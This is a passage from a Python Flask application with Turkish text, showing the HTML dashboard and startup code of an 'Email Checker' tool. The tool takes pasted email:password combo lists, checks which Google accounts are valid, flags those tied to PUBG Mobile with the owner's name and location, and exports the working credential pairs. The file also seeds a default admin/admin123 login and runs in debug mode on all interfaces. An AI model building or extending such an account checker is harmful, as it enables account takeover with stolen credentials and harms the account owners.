    </div>
</body>
</html>
"""

# Ana Dashboard HTML - (Kısaltılmış, tam çalışan versiyon)
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📊 Dashboard - Email Checker</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0a; color: #fff; min-height: 100vh; }
        .container { max-width: 1100px; margin: 0 auto; padding: 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px; background: linear-gradient(135deg, #1a1a1a, #2a2a2a); border-radius: 16px; border: 1px solid #333; margin-bottom: 30px; flex-wrap: wrap; gap: 10px; }
        .header h1 { font-size: 28px; background: linear-gradient(135deg, #ffd700, #ff6b00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header .user { color: #888; display: flex; align-items: center; gap: 15px; }
        .header .user a { color: #ffd700; text-decoration: none; }
        .header .user a:hover { text-decoration: underline; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }
        .stat-card { background: #1a1a1a; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #333; }
        .stat-card .num { font-size: 30px; font-weight: bold; }
        .stat-card .label { color: #888; font-size: 13px; }
        .stat-card.gold .num { color: #ffd700; }
        .stat-card.green .num { color: #00ff88; }
        .stat-card.red .num { color: #ff0044; }
        .stat-card.orange .num { color: #ff6b00; }
        .section { background: #1a1a1a; border-radius: 12px; padding: 25px; margin: 20px 0; border: 1px solid #333; }
        .section h2 { color: #ffd700; margin-bottom: 15px; font-size: 20px; }
        .form-group { margin: 10px 0; }
        .form-group label { color: #888; display: block; margin-bottom: 5px; }
        .form-group input, .form-group textarea { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #333; background: #0a0a0a; color: #fff; font-size: 14px; }
        .form-group input:focus, .form-group textarea:focus { outline: none; border-color: #ffd700; }
        .form-group textarea { min-height: 80px; resize: vertical; font-family: monospace; }
        .btn { padding: 10px 25px; border: none; border-radius: 8px; font-size: 14px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn-primary { background: linear-gradient(135deg, #ffd700, #ff6b00); color: #000; }
        .btn-primary:hover { transform: scale(1.02); }
        .btn-success { background: #00ff88; color: #000; }
        .btn-success:hover { transform: scale(1.02); }
        .btn-danger { background: #ff0044; color: #fff; }
        .btn-danger:hover { transform: scale(1.02); }
        .btn-secondary { background: #333; color: #fff; }
        .btn-secondary:hover { background: #444; }
        .btn-group { display: flex; gap: 10px; flex-wrap: wrap; margin: 10px 0; }
        .results-box { max-height: 400px; overflow-y: auto; border-radius: 8px; border: 1px solid #222; margin-top: 10px; }
        .results-box::-webkit-scrollbar { width: 6px; }
        .results-box::-webkit-scrollbar-track { background: #0a0a0a; }
        .results-box::-webkit-scrollbar-thumb { background: #ffd700; border-radius: 3px; }
        .result-item { padding: 8px 15px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 5px; }
        .result-item:hover { background: #222; }
        .result-item .email { color: #00d4ff; font-weight: bold; }
        .result-item .pass { color: #ffd700; font-size: 11px; font-family: monospace; }
        .result-item .status { padding: 2px 10px; border-radius: 12px; font-size: 11px; font-weight: bold; }
        .status.valid { background: #00ff8822; color: #00ff88; border: 1px solid #00ff88; }
        .status.invalid { background: #ff004422; color: #ff0044; border: 1px solid #ff0044; }
        .status.pubg { background: #ff6b0022; color: #ff6b00; border: 1px solid #ff6b00; }
        .footer { text-align: center; padding: 20px; color: #555; border-top: 1px solid #222; margin-top: 30px; }
        .footer a { color: #ffd700; text-decoration: none; }
        @media (max-width: 600px) { .header { flex-direction: column; text-align: center; } .stats-grid { grid-template-columns: 1fr 1fr; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 Email Checker</h1>
            <div class="user">
                <span>👤 {{ username }}</span>
                <a href="/profile">Profil</a>
                <a href="/logout" style="color:#ff0044;">Çıkış</a>
            </div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card gold"><div class="num">{{ stats.total|default(0) }}</div><div class="label">📊 Toplam</div></div>
            <div class="stat-card green"><div class="num">{{ stats.valid|default(0) }}</div><div class="label">✅ Geçerli</div></div>
            <div class="stat-card red"><div class="num">{{ stats.invalid|default(0) }}</div><div class="label">❌ Geçersiz</div></div>
            <div class="stat-card orange"><div class="num">{{ stats.pubg|default(0) }}</div><div class="label">🎯 PUBG Mobile</div></div>
        </div>
        
        <!-- Tekli Kontrol -->
        <div class="section">
            <h2>🔍 Tekli Kontrol</h2>
            <div class="form-group">
                <label>📧 Email</label>
                <input type="email" id="singleEmail" placeholder="ornek@gmail.com">
            </div>
            <div class="form-group">
                <label>🔑 Şifre (Opsiyonel - PUBG kontrolü için)</label>
                <input type="text" id="singlePassword" placeholder="Şifre girerseniz PUBG kontrolü de yapılır">
            </div>
            <button class="btn btn-primary" onclick="checkSingle()">🔍 Kontrol Et</button>
            <div id="singleResult" style="margin-top:10px;"></div>
        </div>
        
        <!-- Toplu Kontrol -->
        <div class="section">
            <h2>📂 Toplu Kontrol</h2>
            <div class="form-group">
                <label>📝 Email:Şifre listesi (Her satırda bir hesap)</label>
                <textarea id="bulkEmails" placeholder="ornek1@gmail.com:şifre1&#10;ornek2@gmail.com:şifre2"></textarea>
            </div>
            <button class="btn btn-success" onclick="checkBulk()">🔍 Hepsini Kontrol Et</button>
            <div id="bulkResult" style="margin-top:10px;"></div>
        </div>
        
        <!-- Geçerli Mailler -->
        <div class="section">
            <h2>📋 Geçerli Mailler</h2>
            <div class="btn-group">
                <button class="btn btn-primary" onclick="exportEmails()">📥 İndir</button>
                <button class="btn btn-secondary" onclick="copyEmails()">📋 Kopyala</button>
                <button class="btn btn-danger" onclick="clearData()">🗑️ Temizle</button>
            </div>
            <div class="results-box">
                {% for email in emails.emails|reverse %}
                    {% if email.valid %}
                    <div class="result-item">
                        <span><span class="email">{{ email.email }}</span> <span class="pass">:{{ email.password|default('BULUNAMADI') }}</span></span>
                        <span>
                            <span class="status valid">✅ Geçerli</span>
                            {% if email.is_pubg %}<span class="status pubg">🎯 PUBG</span>{% endif %}
                        </span>
                    </div>
                    {% endif %}
                {% endfor %}
            </div>
        </div>
        
        <!-- PUBG Mailleri -->
        <div class="section">
            <h2>🎯 PUBG Mobile Mailler</h2>
            <div class="btn-group">
                <button class="btn btn-primary" onclick="exportPubg()">📥 PUBG İndir</button>
            </div>
            <div class="results-box">
                {% for email in emails.emails|reverse %}
                    {% if email.is_pubg %}
                    <div class="result-item">
                        <span><span class="email">{{ email.email }}</span> <span class="pass">:{{ email.password|default('BULUNAMADI') }}</span></span>
                        <span>
                            <span class="status pubg">🎯 PUBG</span>
                            <span style="color:#888;font-size:11px;">{{ email.pubg_details.total_pubg_mails|default(0) }} mail</span>
                        </span>
                    </div>
                    {% endif %}
                {% endfor %}
            </div>
        </div>
        
        <!-- Tüm Sonuçlar -->
        <div class="section">
            <h2>📊 Tüm Kontroller</h2>
            <div class="results-box">
                {% for email in emails.emails|reverse %}
                <div class="result-item">
                    <span><span class="email">{{ email.email }}</span> <span class="pass">:{{ email.password|default('BULUNAMADI') }}</span></span>
                    <span>
                        <span class="status {{ 'valid' if email.valid else 'invalid' }}">
                            {{ '✅ Geçerli' if email.valid else '❌ Geçersiz' }}
                        </span>
                        {% if email.is_pubg %}<span class="status pubg">🎯 PUBG</span>{% endif %}
                    </span>
                </div>
                {% endfor %}
            </div>
        </div>
        
        <div class="footer">
            <p>📞✈️ <a href="https://t.me/rinexdestek" target="_blank">@rinexdestek</a></p>
        </div>
    </div>
    
    <script>
        // Tekli Kontrol
        async function checkSingle() {
            const email = document.getElementById('singleEmail').value.trim();
            const password = document.getElementById('singlePassword').value.trim();
            
            if (!email) { alert('Email girin!'); return; }
            
            const btn = event.target;
            const resultDiv = document.getElementById('singleResult');
            btn.textContent = '⏳ Kontrol ediliyor...';
            btn.disabled = true;
            resultDiv.innerHTML = '<div style="color:#888;">Kontrol ediliyor...</div>';
            
            try {
                const res = await fetch('/api/check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                const data = await res.json();
                
                if (data.success) {
                    const r = data.result;
                    let html = `<div style="color:#00ff88;">✅ Kontrol tamamlandı!</div>`;
                    html += `<div>📧 ${r.email}</div>`;
                    html += `<div>Durum: ${r.valid ? '✅ GEÇERLİ' : '❌ GEÇERSİZ'}</div>`;
                    if (r.is_pubg) {
                        html += `<div style="color:#ff6b00;">🎯 PUBG Mobile HESABI BULUNDU!</div>`;
                        if (r.pubg_details) {
                            html += `<div>📬 PUBG Mail: ${r.pubg_details.total_pubg_mails}</div>`;
                            html += `<div>👤 İsim: ${r.pubg_details.name}</div>`;
                            html += `<div>📍 Konum: ${r.pubg_details.location}</div>`;
                        }
                    }
                    resultDiv.innerHTML = html;
                    setTimeout(() => location.reload(), 2000);
                } else {
                    resultDiv.innerHTML = `<div style="color:#ff0044;">❌ Hata: ${data.error}</div>`;
                }
            } catch(e) {
                resultDiv.innerHTML = `<div style="color:#ff0044;">❌ Hata: ${e}</div>`;
            } finally {
                btn.textContent = '🔍 Kontrol Et';
                btn.disabled = false;
            }
        }
        
        // Toplu Kontrol
        async function checkBulk() {
            const text = document.getElementById('bulkEmails').value.trim();
            if (!text) { alert('Hesap listesi girin!'); return; }
            
            const items = text.split('\\n').map(l => l.trim()).filter(l => l);
            if (!items.length) { alert('Hesap bulunamadı!'); return; }
            
            const parsed = items.map(line => {
                if (line.includes(':')) {
                    const [email, password] = line.split(':', 1);
                    return { email: email.trim(), password: password ? password.trim() : '' };
                }
                return { email: line, password: '' };
            }).filter(item => item.email && item.email.includes('@'));
            
            if (!parsed.length) { alert('Geçerli email bulunamadı!'); return; }
            if (parsed.length > 100) { alert('Maksimum 100 hesap!'); return; }
            
            const btn = event.target;
            const resultDiv = document.getElementById('bulkResult');
            btn.textContent = `⏳ ${parsed.length} hesap kontrol ediliyor...`;
            btn.disabled = true;
            resultDiv.innerHTML = `<div style="color:#888;">${parsed.length} hesap kontrol ediliyor...</div>`;
            
            try {
                const res = await fetch('/api/check-bulk', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ items: parsed })
                });
                const data = await res.json();
                
                if (data.success) {
                    let html = `<div style="color:#00ff88;">✅ ${data.total} hesap kontrol edildi!</div>`;
                    html += `<div>✅ Geçerli: ${data.valid_count}</div>`;
                    html += `<div>🎯 PUBG: ${data.pubg_count}</div>`;
                    resultDiv.innerHTML = html;
                    setTimeout(() => location.reload(), 2000);
                } else {
                    resultDiv.innerHTML = `<div style="color:#ff0044;">❌ Hata: ${data.error}</div>`;
                }
            } catch(e) {
                resultDiv.innerHTML = `<div style="color:#ff0044;">❌ Hata: ${e}</div>`;
            } finally {
                btn.textContent = '🔍 Hepsini Kontrol Et';
                btn.disabled = false;
            }
        }
        
        // Dışa Aktar
        async function exportEmails() {
            try {
                const res = await fetch('/api/export');
                if (res.ok) {
                    const blob = await res.blob();
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'valid_emails.txt';
                    a.click();
                } else {
                    alert('❌ ' + (await res.text()));
                }
            } catch(e) { alert('❌ Hata: ' + e); }
        }
        
        async function exportPubg() {
            try {
                const res = await fetch('/api/export-pubg');
                if (res.ok) {
                    const blob = await res.blob();
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'pubg_emails.txt';
                    a.click();
                } else {
                    alert('❌ ' + (await res.text()));
                }
            } catch(e) { alert('❌ Hata: ' + e); }
        }
        
        async function copyEmails() {
            try {
                const res = await fetch('/api/export');
                const text = await res.text();
                if (text.includes('error')) { alert('❌ ' + text); return; }
                await navigator.clipboard.writeText(text);
                alert('📋 Email\'ler kopyalandı!');
            } catch(e) { alert('❌ Hata: ' + e); }
        }
        
        async function clearData() {
            if (!confirm('Tüm verileriniz silinsin mi?')) return;
            try {
                await fetch('/api/clear-data', { method: 'POST' });
                location.reload();
            } catch(e) { alert('❌ Hata: ' + e); }
        }
    </script>
</body>
</html>
"""

# ==================== MAIN ====================

if __name__ == "__main__":
    init_data_dir()
    
    # Varsayılan admin kullanıcısı
    users = load_users()
    if not users:
        users["admin"] = {
            "username": "admin",
            "email": "admin@example.com",
            "password": generate_password_hash("admin123"),
            "created_at": datetime.now().isoformat(),
            "last_login": None,
            "email_count": 0,
            "valid_count": 0,
            "pubg_count": 0
        }
        save_users(users)
    
    port = int(os.environ.get("PORT", 5000))
    
    print("=" * 60)
    print("🎯 Gelişmiş Email Checker + PUBG API Başlatıldı")
    print("=" * 60)
    print(f"📡 Port: {port}")
    print(f"👤 Varsayılan: admin / admin123")
    print("📧 Google Hesap Doğrulama: Aktif")
    print("🎯 PUBG Mobile Kontrol: Aktif")
    print("🔐 Şifre Sıfırlama: Aktif")
    print("=" * 60)
    
    app.run(host="0.0.0.0", port=port, debug=True)
